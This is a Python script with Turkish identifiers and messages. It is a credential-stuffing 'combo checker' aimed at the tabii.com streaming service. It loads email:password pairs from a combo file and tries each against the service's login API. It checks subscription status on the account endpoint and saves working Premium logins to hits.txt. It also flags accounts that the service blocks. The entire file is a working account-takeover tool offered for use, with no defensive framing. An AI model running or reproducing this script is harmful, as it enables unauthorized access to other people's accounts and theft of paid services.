import requests
import json

class Renkler:
    YEŞİL = '\033[92m'
    KIRMIZI = '\033[91m'
    SARI = '\033[93m'
    SIFIRLA = '\033[0m'


def giris_yap_ve_token_al(email, şifre):
    url = "https://eu1.tabii.com/apigateway/auth/v2/login"
    payload = {
        "email": email,
        "password": şifre,
        "remember": False
    }
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
        'Accept': "application/json, text/plain, */*",
        'content-type': "application/json;charset=UTF-8",
        'accept-language': "tr",
        'referer': "https://www.tabii.com/",
    }
    
    response = requests.post(url, data=json.dumps(payload), headers=headers)
    if response.status_code == 200 and "accessToken" in response.json():
        return response.json()["accessToken"]
    elif response.status_code == 403 or "Request blocked" in response.text:
        return "YASAKLI"
    return None


def kullanici_bilgilerini_kontrol_et(access_token):
    url = "https://eu1.tabii.com/apigateway/auth/v2/me"
    headers = {
        "Authorization": f"Bearer {access_token}",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        return response.json()
    return None

def combolari_isle(combo_dosyasi):
    try:
        with open(combo_dosyasi, 'r', encoding='utf-8') as file:
            combos = file.readlines()
        
        with open("hits.txt", "a", encoding='utf-8') as hit_file:
            for combo in combos:
                try:
                    email, şifre = combo.strip().split(":")
                    token = giris_yap_ve_token_al(email, şifre)

                    if token == "YASAKLI":
                        print(f"{Renkler.KIRMIZI}YASAKLI: {email}:{şifre}{Renkler.SIFIRLA}")
                        continue

                    if token:
                        user_info = kullanici_bilgilerini_kontrol_et(token)
                        if user_info:
                            title = user_info.get("subscription", {}).get("title", "Mail Doğrulama")
                            email_verified = user_info.get("emailVerified", True)

                            if "Premium" in title:
                                print(f"{Renkler.YEŞİL}HIT: {email}:{şifre} ({title}){Renkler.SIFIRLA}")
                                hit_file.write(f"{email}:{şifre}\n")
                            elif "Ücretsiz" in title or "Free" in title or not email_verified:
                                print(f"{Renkler.SARI}CUSTOM: {email}:{şifre} ({title}){Renkler.SIFIRLA}")
                            else:
                                print(f"{Renkler.KIRMIZI}BAD: {email}:{şifre}{Renkler.SIFIRLA}")
                        else:
                            print(f"{Renkler.KIRMIZI}BAD: {email}:{şifre}{Renkler.SIFIRLA}")
                    else:
                        print(f"{Renkler.KIRMIZI}BAD: {email}:{şifre}{Renkler.SIFIRLA}")
                except ValueError:
                    print(f"{Renkler.KIRMIZI}Geçersiz format: {combo.strip()}{Renkler.SIFIRLA}")
    except FileNotFoundError:
        print(f"{Renkler.KIRMIZI}Combo dosyası bulunamadı. Lütfen doğru yolu girin.{Renkler.SIFIRLA}")


if __name__ == "__main__":
    combo_dosyasi = input("Combo dosyasının yolunu girin: ")
    combolari_isle(combo_dosyasi)